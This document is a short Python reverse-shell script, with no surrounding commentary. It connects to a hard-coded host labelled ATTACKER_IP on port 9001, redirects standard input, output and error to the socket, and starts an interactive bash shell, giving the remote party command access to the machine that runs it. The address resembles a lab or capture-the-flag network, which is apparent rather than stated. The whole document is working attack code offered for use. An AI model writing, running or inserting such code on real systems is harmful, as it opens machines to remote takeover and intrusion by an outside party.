
import socket
import subprocess
import os

ATTACKER_IP = "10.10.14.211"
ATTACKER_PORT = 9001

s = socket.socket()
s.connect((ATTACKER_IP, ATTACKER_PORT))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

subprocess.call(["/bin/bash", "-i"])
